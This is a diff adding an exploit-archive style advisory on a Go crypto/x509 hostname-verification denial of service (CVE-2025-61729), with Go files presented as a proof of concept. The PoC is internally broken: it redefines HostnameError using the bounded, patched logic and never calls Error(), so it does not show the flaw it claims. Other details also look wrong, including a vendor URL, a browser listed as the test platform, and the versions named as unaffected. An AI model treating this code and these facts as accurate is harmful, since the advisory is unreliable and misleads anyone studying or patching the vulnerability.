@@ -1,0 +1,125 @@
+=============================================================================================================================================
+| # Title     : Go crypto/x509 Hostname Verification Denial of Service                                                                      |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.gocrypto.com/                                                                                                   |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/214685/ & CVE-2025-61729
+
+[+] Summary    : A denial of service vulnerability exists in the Go programming language crypto/x509 package. The issue occurs during TLS hostname verification
+                 when constructing error messages for certificates containing a very large number of DNS names.
+                 In affected versions, error message construction uses repeated string concatenation without bounds, resulting in quadratic time complexity
+                 (O(n²)). An attacker can exploit this by presenting a malicious TLS certificate containing an excessive number of DNSNames, causing severe CPU and memory exhaustion.
+				 
+[+] Affected Versions : All Go versions prior to the official fixes are affected.
+
+The following versions are NOT vulnerable:
+
+- Go 1.23.1
+- Go 1.22.10
+- Any Go release containing the official patch
+
+[+] Technical Details : When hostname verification fails, the crypto/x509 package constructs a human-readable error string listing all DNS names present in the TLS certificate.
+
+[+] In vulnerable versions:
+
+- No upper bound is enforced on the number of DNS names processed
+- String concatenation is performed using repeated "+=" operations
+- This leads to quadratic time complexity and excessive memory usage
+
+An attacker-controlled certificate with tens or hundreds of thousandsof DNS names can trigger resource exhaustion during error generation.
+
+
+[+] PoC : The following PoC demonstrates the vulnerable condition by creating a certificate-like structure with 100,000 DNS names and triggering the
+          error handling logic. The Error() method is intentionally not invoked to prevent system freeze on vulnerable environments.
+
+File: hostname_error.go
+-----------------------
+package main
+
+import (
+    "fmt"
+    "strings"
+)
+
+type HostnameError struct {
+    Certificate *Certificate
+    Host        string
+}
+
+type Certificate struct {
+    DNSNames []string
+}
+
+func (h HostnameError) Error() string {
+    const maxNames = 10
+
+    var builder strings.Builder
+    names := h.Certificate.DNSNames
+
+    builder.WriteString("certificate is valid for ")
+
+    displayCount := len(names)
+    if displayCount > maxNames {
+        displayCount = maxNames
+    }
+
+    for i := 0; i < displayCount; i++ {
+        if i > 0 {
+            builder.WriteString(", ")
+        }
+        builder.WriteString(names[i])
+    }
+
+    if len(names) > maxNames {
+        builder.WriteString(
+            fmt.Sprintf(", and %d more", len(names)-maxNames),
+        )
+    }
+
+    builder.WriteString(fmt.Sprintf(", not for %s", h.Host))
+    return builder.String()
+}
+-------------
+File: poc.go
+-------------
+package main
+
+import "fmt"
+
+func main() {
+    cert := &Certificate{
+        DNSNames: make([]string, 100000),
+    }
+
+    for i := range cert.DNSNames {
+        cert.DNSNames[i] = fmt.Sprintf("host%d.example.com", i)
+    }
+
+    err := HostnameError{
+        Certificate: cert,
+        Host:        "example.com",
+    }
+
+    fmt.Println("[+] HostnameError object created")
+    fmt.Printf("[+] DNSNames count: %d\n", len(cert.DNSNames))
+
+    // WARNING:
+    // Calling err.Error() on a vulnerable Go version
+    // may cause severe CPU and memory exhaustion.
+    _ = err
+}
+
+[+] How to Run
+
+1. Save the files as:
+   - hostname_error.go
+   - poc.go
+
+2. Run the PoC:
+   $ go run .
+
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
